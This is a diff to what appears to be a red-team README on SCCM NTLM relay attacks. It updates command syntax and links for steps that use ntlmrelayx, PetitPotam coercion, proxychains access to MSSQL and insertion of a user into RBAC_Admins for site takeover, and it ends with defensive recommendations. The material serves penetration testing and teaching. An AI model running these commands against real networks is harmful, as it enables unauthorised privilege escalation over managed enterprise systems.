@@ -29,7 +29,7 @@ I learned these attacks through the amazing public research from [SpecterOps](ht
   
 ### Steps:
 1. Start ntlmrelayx targeting an SCCM server with SMB signing set to false  
-```python3 ntlmrelayx.py -t "<TARGET IP>" -smb2support –socks```
+```impacket-ntlmrelayx -t "<TARGET IP>" -smb2support –socks```
 2. Coerce authentication from an SCCM server to your IP  
 ```python3 petiPotam.py -u <user> -p <password> <your-ip> <target-ip>```
 3. Connect to SMB share through proxychains  
@@ -49,7 +49,7 @@ I learned these attacks through the amazing public research from [SpecterOps](ht
 Video Coming Soon
 ### Requirements:
 - Any domain credentials
-- At least two SCCM servers with ONE having MSSQL service and EPA disabled
+- At least two SCCM servers with ONE having MSSQL service and [EPA disabled](https://specterops.io/blog/2025/11/25/less-praying-more-relaying-enumerating-epa-enforcement-for-mssql-and-https/)
 - [PetitPotam](https://github.com/topotam/PetitPotam)
 - [Impacket tools](https://www.kali.org/tools/impacket/)
 - [RelayInformer](https://github.com/zyn3rgy/RelayInformer/tree/main/Python)
@@ -59,14 +59,14 @@ Video Coming Soon
 1. Check for EPA disabled or turned off  
 ```uv run relayinformer mssql --target <TARGET Hostname> --user <domain>/<username> --password <password>```
 2. Start ntlmrelayx targeting an SCCM MSSQL Server  
-```python3 ntlmrelayx.py -t mssql://<TARGET IP> -smb2support –socks```
+```impacket-ntlmrelayx -t mssql://<TARGET IP> -smb2support –socks```
 3. Coerce authentication from an SCCM server (ideally Site Server) to your IP  
 ```python3 petiPotam.py -u <user> -p <password> <your-ip> <target-ip>```
 4. Confirm connection and connect to mssql service through proxychains  
 ```proxychains impacket-mssqlclient <domain>/<user>@<target-ip> -no-pass -windows-auth```
-5. Get user’s SID for SQL commands in Step 5
+5. Get user’s SID for SQL commands in Step 5  
 ```python3 sccmhunter.py mssql -d <domain> -dc-ip <dc ip> -tu <user> -sc <sccm site> -u <user> -p <password>```
-6. Add user to RBAC_Admins and query user’s AdminID  
+6. Add user to RBAC_Admins and query user’s AdminID   
 ```
 use CM_<site_code>
 
@@ -88,6 +88,6 @@ delete from RBAC_Admins where AdminID=<AdminID>
 ```
 
 ### Recommendations:
-- Enforce [EPA](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview#policy-locations-for-smb-signing) on MSSQL server and perform frequent auditing
+- [Enable EPA](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection?view=sql-server-ver17#enable-extended-protection-for-the-database-engine) on MSSQL server and perform frequent auditing
 - Monitor for common coerce tools such as PetitPotam using default requests ([Splunk example](https://research.splunk.com/endpoint/95b8061a-0a67-11ec-85ec-acde48001122/)]
 
